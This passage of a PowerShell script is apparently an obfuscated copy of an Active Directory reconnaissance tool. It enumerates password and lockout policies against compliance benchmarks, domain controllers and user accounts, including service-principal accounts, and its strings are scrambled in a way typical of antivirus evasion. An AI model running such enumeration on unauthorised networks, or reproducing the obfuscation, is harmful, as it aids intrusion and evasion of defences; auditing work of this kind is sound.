            ("{4}{0}{1}{2}{3}" -f 'um',' password',' age (','days)','Maxim'), $ADpasspolicy."m`Axp`ASS`wO`RDAge"."Da`yS", "90", ("{0}{2}{1}" -f'Req','8.2.4','. '), "90", ("{3}{2}{0}{1}" -f'4','23','ol: 0','Contr'), ("{0}{2}{1}"-f '1 ',' 60','to'),
            (("{3}{4}{2}{1}{5}{0}"-f's)','sword a',' pas','Minimu','m','ge (day')), $ADpasspolicy."miNPassw`Or`Dage"."Da`ys", "N/A", "-", "1", ("{1}{2}{0}" -f'3','Control:',' 042'), ("{2}{3}{1}{0}"-f 'more',' ','1',' or'),
            ("{7}{10}{6}{8}{0}{1}{9}{5}{2}{3}{4}"-f 'rd',' leng','(chara','cter','s)','h ',' pass','Min','wo','t','imum'), $ADpasspolicy."mINP`Ass`wo`Rdle`NgtH", "7", ("{0}{1}{2}"-f 'R','e','q. 8.2.3'), "13", ("{0}{1}{4}{2}{3}" -f'Co','ntr','l',': 0421','o'), ("{0}{1}{3}{2}"-f '14 o','r ','ore','m'),
            ("{5}{8}{1}{9}{0}{4}{3}{6}{7}{2}" -f' meet c','d mu','ts','e','ompl','Passw','xity require','men','or','st'), $ADpasspolicy."c`Omp`LexityENABl`eD", $true, ("{2}{0}{1}"-f '.2.','3','Req. 8'), $true, ("{4}{1}{0}{3}{2}"-f'l','ontro',' 0421',':','C'), $true,
            ("{16}{6}{4}{12}{5}{0}{17}{7}{19}{8}{10}{13}{9}{2}{20}{15}{11}{18}{1}{14}{3}" -f'd ','s','n f','n the domain','e pass','or','tor','n','evers','yptio','ible e',' ','w','ncr','ers i','all','S','usi','u','g r','or '), $ADpasspolicy."REVersI`B`L`eencR`YPTI`onE`NABLeD", "N/A", "-", "N/A", "-", $false,
            ("{4}{6}{1}{0}{3}{2}{5}" -f ' ','uration','mins','(','Accoun',')','t lockout d'), $ADpasspolicy."LOcKoUT`DuRA`T`I`ON"."minUT`eS", ("{0}{2}{3}{5}{4}{1}"-f'0 (ma','or 30','n','ual','lock) ',' un'), ("{2}{0}{1}" -f 'q. ','8.1.7','Re'), "N/A", "-", ("{0}{1}{3}{2}" -f'1','5 or','more',' '),
            (("{3}{0}{6}{5}{4}{1}{7}{2}" -f'ccount l','h',')','A',' thres','out','ock','old (attempts')), $ADpasspolicy."LOc`kOut`ThReS`HoLD", ("{0}{1}"-f '1 ','to 6'), ("{2}{0}{1}{3}"-f'q','. 8.1.','Re','6'), ("{1}{0}"-f' to 5','1'), ("{0}{1}{2}"-f 'Control',': 140','3'), ("{1}{2}{0}" -f ' 10','1',' to'),
            ("{7}{9}{8}{5}{0}{10}{3}{4}{2}{1}{11}{6}"-f' lock','r (m','te','ut counter',' af','unt','ns)','Reset a','o','cc','o','i'), $ADpasspolicy."Lock`oUTObS`Erv`ATIo`Nw`In`Dow"."Min`UT`es", "N/A", "-", "N/A", "-", ("{2}{3}{1}{0}" -f 'more',' ','15',' or') )

            Remove-Variable ADpasspolicy
        }
    }

    If ($Method -eq ("{1}{0}"-f 'AP','LD'))
    {
        If ($ObjDomain)
        {
            
            $pwdProperties = @{
                ("{3}{4}{6}{2}{0}{1}{5}"-f'RD','_COMP','_PASSWO','D','O','LEX','MAIN') = 1;
                ("{4}{0}{3}{2}{1}{5}" -f 'IN_PA','_NO_','SWORD','S','DOMA','ANON_CHANGE') = 2;
                ("{7}{1}{0}{3}{6}{5}{4}{2}" -f 'N_P','I','ANGE','A','_CH','RD_NO_CLEAR','SSWO','DOMA') = 4;
                ("{0}{2}{1}{3}{4}{5}" -f 'DOM','N_LO','AI','CKOU','T_ADMI','NS') = 8;
                ("{0}{2}{6}{1}{4}{3}{5}"-f'DOMA','SWOR','IN','T','D_STORE_CLEAR','EXT','_PAS') = 16;
                ("{5}{2}{0}{1}{4}{3}" -f '_R','EFU','AIN','PASSWORD_CHANGE','SE_','DOM') = 32
            }

            If (($ObjDomain."P`wdp`ROP`eRT`iES"."VAl`UE" -band $pwdProperties[("{4}{5}{6}{1}{3}{2}{0}"-f'X','ORD_COM','E','PL','DOM','A','IN_PASSW')]) -eq $pwdProperties[("{2}{1}{4}{0}{3}"-f 'OMPL','SWORD','DOMAIN_PAS','EX','_C')])
            {
                $ComplexPasswords = $true
            }
            Else
            {
                $ComplexPasswords = $false
            }

            If (($ObjDomain."p`wdPRO`PErties"."VAL`Ue" -band $pwdProperties[("{6}{0}{1}{3}{2}{5}{4}"-f'_PASSWO','RD_','E_','STOR','T','CLEARTEX','DOMAIN')]) -eq $pwdProperties[("{2}{5}{0}{3}{1}{4}"-f 'P','D','DOMA','ASSWOR','_STORE_CLEARTEXT','IN_')])
            {
                $ReversibleEncryption = $true
            }
            Else
            {
                $ReversibleEncryption = $false
            }

            $LockoutDuration = $($ObjDomain.("{3}{5}{2}{7}{1}{4}{0}{6}"-f 'nt6','Integ','ertLarg','Co','erToI','nv','4','e').Invoke($ObjDomain."LoCkO`Ut`Du`RA`Tion"."vAL`Ue")/-600000000)

            If ($LockoutDuration -gt 99999)
            {
                $LockoutDuration = 0
            }

            $ObjValues = @( ("{5}{6}{9}{2}{1}{0}{4}{7}{3}{8}"-f 'story (','d hi','swor','sswords','p','E','nforce','a',')',' pas'), $ObjDomain."pW`dhiSTO`R`YlenGTH"."v`Alue", "4", ("{1}{0}{2}" -f '.2','Req. 8','.5'), "8", ("{2}{1}{3}{4}{0}" -f'3','ont','C','rol',': 042'), ("{2}{0}{3}{1}"-f 'or ','e','24 ','mor'),
            ("{2}{4}{1}{0}{3}{5}"-f 'ay','e (d','Maximum ','s','password ag',')'), $($ObjDomain.("{2}{6}{0}{1}{5}{4}{3}" -f 'Int','eger','ConvertL','nt64','oI','T','arge').Invoke($ObjDomain."MAxPw`dA`Ge"."v`ALuE") /-864000000000), "90", ("{1}{0}{2}" -f'q. 8.2','Re','.4'), "90", ("{0}{2}{3}{1}"-f 'Contr','3','ol: 04','2'), ("{0}{1}{2}" -f '1',' to',' 60'),
            ("{3}{6}{7}{4}{2}{5}{1}{0}"-f '(days)','age ','swo','M','m pas','rd ','ini','mu'), $($ObjDomain.("{2}{0}{4}{3}{1}"-f 'tLar','4','Conver','ToInt6','geInteger').Invoke($ObjDomain."M`In`pW`DaGe"."V`AlUE") /-864000000000), "N/A", "-", "1", ("{2}{1}{0}"-f'423','trol: 0','Con'), ("{2}{1}{0}" -f 'ore','or m','1 '),
            (("{4}{2}{1}{7}{3}{6}{0}{5}" -f 'ar','ssw','a','d le','Minimum p','acters)','ngth (ch','or')), $ObjDomain."MiNP`WDLe`NGTH"."vA`Lue", "7", ("{1}{2}{0}" -f'.2.3','R','eq. 8'), "13", ("{3}{0}{1}{2}"-f 'r','ol: 0','421','Cont'), ("{3}{1}{2}{0}"-f 'ore','4 or ','m','1'),
            ("{4}{9}{5}{8}{10}{0}{6}{1}{3}{7}{2}" -f't meet ','i','nts','r','Pa','ord ','complexity requ','eme','m','ssw','us'), $ComplexPasswords, $true, ("{2}{0}{1}"-f '8.2','.3','Req. '), $true, ("{1}{2}{0}" -f '0421','Cont','rol: '), $true,
            ("{11}{4}{14}{12}{13}{8}{3}{9}{1}{10}{0}{5}{2}{7}{6}"-f ' the ',' ','om','ryption f','ssword us','d','n','ai','nc','or all users','in','Store pa','si','ble e','ing rever'), $ReversibleEncryption, "N/A", "-", "N/A", "-", $false,
            ("{8}{0}{2}{1}{7}{5}{4}{3}{6}"-f 'oun','c','t lo','min','n (','duratio','s)','kout ','Acc'), $LockoutDuration, (("{4}{2}{1}{3}{0}" -f '0','unlock)','nual ',' or 3','0 (ma')), ("{0}{1}{2}"-f 'R','eq. 8','.1.7'), "N/A", "-", ("{1}{2}{0}"-f 'ore','15',' or m'),
            ("{2}{1}{7}{5}{4}{0}{8}{9}{6}{3}" -f 'ut thr','ou','Acc',' (attempts)','ocko','t l','d','n','esh','ol'), $ObjDomain."L`ocK`OUtth`ReshOlD"."VA`lUe", ("{1}{0}" -f ' to 6','1'), ("{1}{3}{2}{0}"-f '1.6','R','. 8.','eq'), ("{0}{1}" -f'1 t','o 5'), ("{0}{1}{2}{3}"-f'Control:',' ','140','3'), ("{2}{0}{1}"-f ' to ','10','1'),
            ("{2}{0}{5}{8}{7}{1}{4}{3}{6}"-f 'e','ko','Res',' counter after (mins','ut','t a',')','count loc','c'), $($ObjDomain.("{4}{2}{0}{1}{5}{3}{6}" -f'e','rt','v','rgeIntegerToI','Con','La','nt64').Invoke($ObjDomain."lOckoUTo`B`sE`RvA`TiO`Nw`iNdow"."vAL`UE")/-600000000), "N/A", "-", "N/A", "-", ("{2}{1}{0}"-f'e',' mor','15 or') )

            Remove-Variable pwdProperties
            Remove-Variable ComplexPasswords
            Remove-Variable ReversibleEncryption
        }
    }

    If ($ObjValues)
    {
        $ADPassPolObj = @()
        For ($i = 0; $i -lt $($ObjValues."co`UNT"); $i++)
        {
            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f'Po','licy') -Value $ObjValues[$i]
            $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{3}{0}{2}" -f 'u','Current Va','e','l') -Value $ObjValues[$i+1]
            $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{2}{3}{5}{4}{0}"-f'nt','PC','I',' DSS ','uireme','Req') -Value $ObjValues[$i+2]
            $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{2}{1}{3}"-f'PCI DSS ','.','v3.2','1') -Value $ObjValues[$i+3]
            $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f'ISM','ASD ') -Value $ObjValues[$i+4]
            $Obj | Add-Member -MemberType NoteProperty -Name ("{3}{4}{0}{1}{2}"-f ' ','Con','trols','2018 ','ISM') -Value $ObjValues[$i+5]
            $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{4}{3}{0}"-f'6','a','CIS Benchm','01','rk 2') -Value $ObjValues[$i+6]
            $i += 6
            $ADPassPolObj += $Obj
        }
        Remove-Variable ObjValues
        Return $ADPassPolObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRFineGrainedPasswordPolicy
{

    param(
        [Parameter(MAnDaToRY = $true)]
        [string] $Method,

        [Parameter(mAnDaTorY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain
    )

    If ($Method -eq ("{0}{1}"-f 'AD','WS'))
    {
        Try
        {
            $ADFinepasspolicy = Get-ADFineGrainedPasswordPolicy -Filter *
        }
        Catch
        {
            Write-Warning ("{8}{13}{24}{21}{20}{16}{23}{15}{25}{18}{19}{11}{4}{22}{14}{17}{10}{9}{5}{0}{2}{7}{12}{1}{3}{6}"-f 'a','li','sswo','c','ume','ned P','y','rd P','[Get-ADRFi','i','e Gra',' en','o','neGra','ating ','cy] E','rd','the Fin','ror whil','e','o','assw','r','Poli','inedP','r')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADFinepasspolicy)
        {
            $ADPassPolObj = @()

            $ADFinepasspolicy | ForEach-Object {
                For($i=0; $i -lt $($_."App`LIe`StO"."cO`Unt"); $i++)
                {
                    $AppliesTo = $AppliesTo + "," + $_."A`PPlI`Esto"[$i]
                }
                If ($null -ne $AppliesTo)
                {
                    $AppliesTo = $AppliesTo.("{0}{1}{2}"-f'T','ri','mStart').Invoke(",")
                }
                $ObjValues = @(("{1}{0}"-f 'e','Nam'), $($_."N`AMe"), ("{1}{2}{0}"-f ' To','Appl','ies'), $AppliesTo, ("{0}{2}{4}{3}{1}" -f'Enforce p','y','ass','histor','word '), $_."PAS`SwOrdH`IsT`O`RycOU`NT", (("{0}{3}{6}{5}{4}{2}{1}" -f'Maximum',')','ys',' passwor','a','age (d','d ')), $_."M`AxP`ASS`WORdA`gE"."dA`YS", (("{4}{2}{0}{3}{6}{5}{1}" -f ' p','ys)','imum','asswo','Min','(da','rd age ')), $_."mI`NPas`swORDAGE"."d`Ays", ("{4}{3}{1}{0}{2}" -f'rd l','asswo','ength','inimum p','M'), $_."mi`Npa`sSwoRdleng`Th", ("{6}{2}{7}{5}{3}{1}{8}{0}{4}" -f'y requi','x','mu','mple','rements','t meet co','Password ','s','it'), $_."cOmP`le`xItYEN`A`BlEd", ("{2}{1}{3}{5}{4}{7}{6}{0}" -f ' encryption','tore password ','S','using r','ersi','ev','le','b'), $_."RevE`Rsible`E`NcrYP`TiO`NEnaBlEd", (("{3}{4}{6}{5}{2}{0}{1}" -f 'm','ins)','on (','A','ccount l','t durati','ockou')), $_."lOc`kOUTd`UR`At`iOn"."MI`NUTES", ("{0}{3}{6}{1}{4}{5}{2}"-f 'A','unt loc','d','c','kout th','reshol','co'), $_."lOc`K`oU`TT`hREsholD", ("{2}{5}{4}{1}{8}{0}{7}{9}{10}{3}{6}{11}{12}" -f ' ','u','Reset ','e','o','acc','r (','lockout count','nt','er a','ft','mi','ns)'), $_."lOCkOutoBS`ER`VAtIOnW`I`ND`oW"."MiNU`TEs", ("{1}{0}{2}{3}" -f'de','Prece','n','ce'), $($_."p`RecEDe`NcE"))
                For ($i = 0; $i -lt $($ObjValues."co`Unt"); $i++)
                {
                    $Obj = New-Object PSObject
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f'licy','Po') -Value $ObjValues[$i]
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f 'lue','Va') -Value $ObjValues[$i+1]
                    $i++
                    $ADPassPolObj += $Obj
                }
            }
            Remove-Variable ADFinepasspolicy
        }
    }

    If ($Method -eq ("{1}{0}" -f 'AP','LD'))
    {
        If ($ObjDomain)
        {
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            $ObjSearcher."pa`GE`sIzE" = $PageSize
            $ObjSearcher."fILt`eR" = (("{8}{9}{6}{4}{5}{3}{0}{1}{7}{2}"-f'o','rdSett','ngs)','S-Passw','ss=ms','D','la','i','(object','C'))
            $ObjSearcher."S`EArCHSCo`pE" = ("{1}{2}{0}"-f 'e','Subt','re')
            Try
            {
                $ADFinepasspolicy = $ObjSearcher.("{0}{1}"-f'Fin','dAll').Invoke()
            }
            Catch
            {
                Write-Warning ("{12}{1}{11}{5}{18}{6}{15}{9}{16}{10}{7}{13}{14}{3}{8}{4}{0}{17}{19}{2}" -f 'assw','-ADRF','cy','i','d P','edPasswordPolic','rro','ne G','ne','nume','ting the Fi','ineGrain','[Get','r','a','r while e','ra','ord ','y] E','Poli')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }

            If ($ADFinepasspolicy)
            {
                If ( ( Get-iTeM  vaRiABLe:3y9 ).vaLuE::("{0}{1}{3}{2}"-f 'Obje','ct','ount','C').Invoke($ADFinepasspolicy) -ge 1)
                {
                    $ADPassPolObj = @()
                    $ADFinepasspolicy | ForEach-Object {
                    For($i=0; $i -lt $($_."PR`O`PeRtiES".'msds-psoappliesto'."Co`UNT"); $i++)
                    {
                        $AppliesTo = $AppliesTo + "," + $_."pRo`pERtI`Es".'msds-psoappliesto'[$i]
                    }
                    If ($null -ne $AppliesTo)
                    {
                        $AppliesTo = $AppliesTo.("{1}{0}"-f'tart','TrimS').Invoke(",")
                    }
                        $ObjValues = @(("{0}{1}" -f 'Nam','e'), $($_."P`R`oPerTIEs"."n`AME"), ("{2}{0}{1}{3}"-f'pplies ','T','A','o'), $AppliesTo, ("{7}{1}{4}{6}{3}{5}{0}{2}" -f' histo','e ','ry','or','pa','d','ssw','Enforc'), $($_."pR`opERti`ES".'msds-passwordhistorylength'), ("{2}{6}{4}{3}{1}{5}{0}" -f 'e (days)','d a','Ma','asswor','m p','g','ximu'), $($($_."Pr`op`ERTIEs".'msds-maximumpasswordage') /-864000000000), ("{5}{4}{3}{2}{0}{1}{6}"-f ' ','age (days','d','r','passwo','Minimum ',')'), $($($_."pR`OPE`RTIeS".'msds-minimumpasswordage') /-864000000000), ("{1}{2}{3}{5}{0}{4}" -f'engt','Minimum pa','s','sword','h',' l'), $($_."pRo`pe`R`TiES".'msds-minimumpasswordlength'), ("{0}{7}{4}{5}{2}{3}{6}{1}"-f'Pa','nts','complex','ity re','meet',' ','quireme','ssword must '), $($_."PrOP`E`RtIEs".'msds-passwordcomplexityenabled'), ("{1}{4}{2}{5}{0}{6}{7}{3}"-f' encryp','Store ','ersi','n','password using rev','ble','t','io'), $($_."PRo`Pe`RTIeS".'msds-passwordreversibleencryptionenabled'), ("{1}{0}{3}{5}{4}{2}" -f'c','Ac','ation (mins)','ount lockout','dur',' '), $($($_."p`ROPE`RtiES".'msds-lockoutduration')/-600000000), ("{2}{1}{5}{4}{0}{3}"-f'hresho','cc','A','ld','t lockout t','oun'), $($_."P`RopE`RtIeS".'msds-lockoutthreshold'), ("{0}{1}{5}{7}{2}{10}{6}{9}{3}{4}{8}" -f'Rese','t ac','ckout','te','r (','co','ounter a','unt lo','mins)','f',' c'), $($($_."p`ROp`E`RTIEs".'msds-lockoutobservationwindow')/-600000000), ("{1}{2}{0}{3}" -f'e','Pr','eced','nce'), $($_."pR`o`pE`RtIES".'msds-passwordsettingsprecedence'))
                        For ($i = 0; $i -lt $($ObjValues."cOu`NT"); $i++)
                        {
                            $Obj = New-Object PSObject
                            $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f 'Polic','y') -Value $ObjValues[$i]
                            $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f'e','Valu') -Value $ObjValues[$i+1]
                            $i++
                            $ADPassPolObj += $Obj
                        }
                    }
                }
                Remove-Variable ADFinepasspolicy
            }
        }
    }

    If ($ADPassPolObj)
    {
        Return $ADPassPolObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRDomainController
{

    param(
        [Parameter(mANdaTORY = $true)]
        [string] $Method,

        [Parameter(mAndAtory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(mAndAtOry = $false)]
        [Management.Automation.PSCredential] $Credential =   (DiR vAriabLE:q3cuvM  ).vaLuE::"E`MPtY"
    )

    If ($Method -eq ("{0}{1}"-f'ADW','S'))
    {
        Try
        {
            $ADDomainControllers = @( Get-ADDomainController -Filter * )
        }
        Catch
        {
            Write-Warning ("{11}{18}{16}{12}{2}{1}{17}{10}{8}{9}{0}{5}{15}{7}{3}{13}{6}{4}{14}" -f 'e','r','ro','er','t','ra','Objec','ontroll','nu','m',' e','[','ainController] Er',' ','s','ting DomainC','t-ADRDom',' while','Ge')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        
        If ($ADDomainControllers)
        {
            Write-Verbose "[*] Total Domain Controllers: $([ADRecon.ADWSClass]::ObjectCount($ADDomainControllers)) "
            $DCObj =   (  gEt-VARiAblE ObR -valU)::("{3}{1}{0}{4}{2}" -f 'trollerPar','ainCon','er','Dom','s').Invoke($ADDomainControllers, $Threads)
            Remove-Variable ADDomainControllers
        }
    }

    If ($Method -eq ("{1}{0}" -f 'P','LDA'))
    {
        If ($Credential -ne   (GcI VariAble:q3cUvM).vAlUe::"emp`Ty")
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain."d`iS`TINGUI`shEdNa`ME")
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(("{0}{1}{2}" -f'Do','m','ain'),$($DomainFQDN),$($Credential."uSEr`Na`mE"),$($Credential.("{5}{0}{1}{4}{2}{3}" -f 'w','ork','re','dential','C','GetNet').Invoke()."PaSsw`ORD"))
            Try
            {
                $ADDomain =  $WM35::("{1}{0}{2}"-f'tDom','Ge','ain').Invoke($DomainContext)
            }
            Catch
            {
                Write-Warning ("{9}{4}{3}{1}{10}{7}{11}{6}{0}{5}{8}{2}" -f 'g Do','r','t','t-ADRDomainController] Erro','Ge','main ','n','e','Contex','[',' g','tti')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            Remove-Variable DomainContext
        }
        Else
        {
            $ADDomain =  (GeT-VariABLe ("w"+"m35")  -vAlUEo)::("{2}{1}{3}{0}{4}"-f'tDoma','r','GetCu','ren','in').Invoke()
        }

        If ($ADDomain."domA`I`Nco`NTr`OllE`Rs")
        {
            Write-Verbose "[*] Total Domain Controllers: $([ADRecon.LDAPClass]::ObjectCount($ADDomain.DomainControllers)) "
            $DCObj =   $3Y9::("{1}{3}{0}{2}" -f'rollerPar','DomainC','ser','ont').Invoke($ADDomain."dOMAInC`ontR`o`LLeRs", $Threads)
            Remove-Variable ADDomain
        }
    }

    If ($DCObj)
    {
        Return $DCObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRUser
{

    param(
        [Parameter(ManDAtory = $true)]
        [string] $Method,

        [Parameter(mANDAtOry = $true)]
        [DateTime] $date,

        [Parameter(MAndaTORy = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(mAnDaTORY = $true)]
        [int] $DormantTimeSpan = 90,

        [Parameter(maNDaTorY = $true)]
        [int] $PageSize,

        [Parameter(mandaTorY = $false)]
        [int] $Threads = 10,

        [Parameter(MaNdAToRy = $false)]
        [int] $ADRUsers = $true,

        [Parameter(maNDAtOrY = $false)]
        [int] $ADRUserSPNs = $false
    )

    If ($Method -eq ("{0}{1}" -f'A','DWS'))
    {
        If (!$ADRUsers)
        {
            Try
            {
                $ADUsers = @( Get-ADObject -LDAPFilter (("{2}{8}{12}{10}{9}{1}{5}{0}{6}{11}{4}{3}{7}" -f 'r',')','(','lN','incipa','(se','vi','ame=*))','&','pe=805306368','countTy','cePr','(samAc')) -ResultPageSize $PageSize -Properties Name,Description,memberOf,sAMAccountName,servicePrincipalName,primaryGroupID,pwdLastSet,userAccountControl )
            }
            Catch
            {
                Write-Warning ("{8}{10}{5}{4}{7}{0}{11}{13}{1}{6}{3}{9}{12}{2}"-f'ile','merati','ects','UserS','ser]','ADRU','ng ',' Error wh','[Get','PN ','-',' e','Obj','nu')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
        }
        Else
        {
            Try
            {
                $ADUsers = @( Get-ADUser -Filter * -ResultPageSize $PageSize -Properties AccountExpirationDate,accountExpires,AccountNotDelegated,AdminCount,AllowReversiblePasswordEncryption,c,CannotChangePassword,CanonicalName,Company,Department,Description,DistinguishedName,DoesNotRequirePreAuth,Enabled,givenName,homeDirectory,Info,LastLogonDate,lastLogonTimestamp,LockedOut,LogonWorkstations,mail,Manager,memberOf,middleName,mobile,("{4}{6}{3}{1}{7}{2}{0}{5}"-f't','oDel','ga','owedT','msDS-Al','eTo','l','e'),("{2}{4}{5}{8}{6}{0}{3}{7}{1}"-f 'ncryptio','s','msD','n','S','-S','portedE','Type','up'),Name,PasswordExpired,PasswordLastSet,PasswordNeverExpires,PasswordNotRequired,primaryGroupID,profilePath,pwdlastset,SamAccountName,ScriptPath,servicePrincipalName,SID,SIDHistory,SmartcardLogonRequired,sn,Title,TrustedForDelegation,TrustedToAuthForDelegation,UseDESKeyOnly,UserAccountControl,whenChanged,whenCreated )
            }
            Catch
            {
                Write-Warning ("{5}{1}{7}{12}{9}{10}{11}{8}{3}{2}{4}{0}{6}" -f 'ser Object','G','en','hile ','umerating U','[','s','e','w','-A','DRUser] E','rror ','t')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
        }
        If ($ADUsers)
        {
            Write-Verbose "[*] Total Users: $([ADRecon.ADWSClass]::ObjectCount($ADUsers)) "
            If ($ADRUsers)
            {
                Try
                {
                    $ADpasspolicy = Get-ADDefaultDomainPasswordPolicy
                    $PassMaxAge = $ADpasspolicy."MAXPas`SWO`R`da`Ge"."D`AYs"
                    Remove-Variable ADpasspolicy
                }
                Catch
                {
                    Write-Warning ("{23}{20}{5}{18}{1}{13}{10}{25}{19}{4}{28}{29}{9}{0}{7}{14}{22}{11}{6}{16}{15}{27}{2}{17}{26}{8}{24}{3}{21}{12}"-f'o',' E','oli','e','rie','r',' D','rd A','ng v','w','ror ','e',' days','r','ge from ','t Pa','efaul','cy. ',']','t','ADRUse',' as 90','th','[Get-','alu','re','Usi','ssword P','ving Ma','x Pass')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                    $PassMaxAge = 90
                }
                $UserObj =   $obr::("{2}{0}{1}"-f 'serPa','rser','U').Invoke($ADUsers, $date, $DormantTimeSpan, $PassMaxAge, $Threads)
            }
            If ($ADRUserSPNs)
            {
                $UserSPNObj =  (  dIr  ('varI'+'Ab'+'lE:O'+'br')  ).VaLue::("{0}{2}{1}{3}" -f'Use','NPars','rSP','er').Invoke($ADUsers, $Threads)
            }
            Remove-Variable ADUsers
        }
    }

    If ($Method -eq ("{1}{0}"-f 'AP','LD'))
    {
        If (!$ADRUsers)
        {
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            $ObjSearcher."PAge`si`ZE" = $PageSize
            $ObjSearcher."fIl`TER" = ("{2}{8}{5}{13}{9}{3}{0}{10}{14}{1}{7}{11}{12}{6}{4}" -f'ce','nci','(&(samA','06368)(servi','=*))','o','e','pal','cc','ntType=8053','P','N','am','u','ri')
            $ObjSearcher."prop`Ert`iE`StolOad".("{0}{2}{1}" -f 'Ad','ange','dR').Invoke((("{0}{1}" -f 'na','me'),("{1}{2}{3}{0}"-f'ion','d','es','cript'),("{1}{0}"-f'of','member'),("{0}{2}{3}{1}"-f 'samac','ame','count','n'),("{5}{4}{0}{2}{3}{6}{1}"-f 'eprin','ame','cip','al','ervic','s','n'),("{4}{3}{1}{0}{2}" -f 'oup','rygr','id','ma','pri'),("{2}{0}{3}{1}" -f 'dlast','et','pw','s'),("{0}{1}{2}{4}{3}"-f'use','racc','ountcon','ol','tr')))
            $ObjSearcher."sEa`RchsC`OPE" = ("{0}{2}{1}"-f'Su','e','btre')
            Try
            {
                $ADUsers = $ObjSearcher.("{0}{2}{1}" -f 'Fin','All','d').Invoke()
            }
            Catch
            {
                Write-Warning ("{9}{5}{8}{12}{3}{1}{6}{4}{7}{11}{2}{10}{0}"-f 'ts','hile en','j',' Error w','merating User','Get-','u','SPN','A','[','ec',' Ob','DRUser]')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            $ObjSearcher.("{1}{0}" -f 'ispose','d').Invoke()
        }
        Else
        {
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            $ObjSearcher."Page`sIZE" = $PageSize
            $ObjSearcher."Fi`LtEr" = (("{8}{1}{2}{6}{0}{5}{7}{3}{4}" -f'nt','a','mAcc','306','368)','Type=8','ou','05','(s'))
            
            $ObjSearcher."SeCu`RiT`YmasKS" = [System.DirectoryServices.SecurityMasks]("{0}{1}"-f'D','acl')
            $ObjSearcher."PrOP`ertIE`STOl`O`AD".("{2}{0}{1}" -f'n','ge','AddRa').Invoke((("{3}{0}{1}{2}"-f'oun','tExpire','s','acc'),("{0}{1}{2}" -f'a','dminco','unt'),"c",("{1}{2}{3}{0}"-f 'ame','canoni','c','aln'),("{1}{0}"-f 'pany','com'),("{0}{1}{3}{2}" -f'de','par','nt','tme'),("{0}{1}{2}" -f 'd','esc','ription'),("{1}{0}{3}{4}{2}"-f'ng','disti','me','u','ishedna'),("{0}{1}{2}" -f 'giv','e','nName'),("{3}{0}{2}{1}" -f 'edi','ry','recto','hom'),("{0}{1}"-f'i','nfo'),("{1}{4}{2}{3}{0}"-f'mp','lastLogo','m','esta','nti'),("{0}{1}" -f'mai','l'),("{2}{0}{1}"-f'n','ager','ma'),("{1}{0}"-f 'f','membero'),("{0}{2}{1}"-f 'middleN','me','a'),("{0}{1}" -f'mo','bile'),("{1}{0}{5}{4}{2}{3}" -f'DS-Allowed','ms','ega','teTo','el','ToD'),("{1}{6}{0}{2}{5}{3}{4}"-f 'ortedEnc','msD','ryp','p','es','tionTy','S-Supp'),("{0}{1}"-f'n','ame'),("{2}{0}{4}{3}{5}{1}"-f'tse','ptor','n','ydes','curit','cri'),("{0}{2}{1}"-f'o','ectsid','bj'),("{1}{3}{0}{2}" -f'imary','p','groupid','r'),("{0}{1}{2}" -f 'profi','le','path'),("{0}{1}{2}"-f'pwd','L','astSet'),("{0}{1}{3}{2}" -f 'sa','ma','e','ccountNam'),("{2}{1}{0}{3}" -f 't','iptpa','scr','h'),("{4}{1}{0}{3}{5}{2}"-f 'ipal','viceprinc','me','n','ser','a'),("{1}{2}{0}"-f 'ory','si','dhist'),"sn",("{1}{0}" -f 'tle','ti'),("{1}{3}{2}{4}{5}{0}"-f'ol','usera','ountcon','cc','t','r'),("{2}{1}{3}{0}" -f'ons','orksta','userw','ti'),("{1}{2}{0}" -f'ed','w','henchang'),("{2}{1}{3}{0}"-f'd','e','whencr','ate')))
            $ObjSearcher."S`e`A`RchscOPe" = ("{2}{1}{0}"-f'ee','tr','Sub')
            Try
            {
                $ADUsers = $ObjSearcher.("{0}{2}{1}" -f 'F','ndAll','i').Invoke()
            }
            Catch
            {
                Write-Warning ("{0}{10}{6}{2}{4}{5}{3}{9}{1}{7}{8}"-f'[Get-ADR',' ','or wh',' Us','ile enumerati','ng','r] Err','Objec','ts','er','Use')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            $ObjSearcher.("{1}{2}{0}" -f 'se','disp','o').Invoke()
        }
        If ($ADUsers)
        {
            Write-Verbose "[*] Total Users: $([ADRecon.LDAPClass]::ObjectCount($ADUsers)) "
            If ($ADRUsers)
            {
                $PassMaxAge = $($ObjDomain.("{3}{0}{6}{1}{2}{5}{4}" -f 'onve','nt','eg','C','nt64','erToI','rtLargeI').Invoke($ObjDomain."maXpwda`gE"."V`AlUe") /-864000000000)
                If (-Not $PassMaxAge)
                {
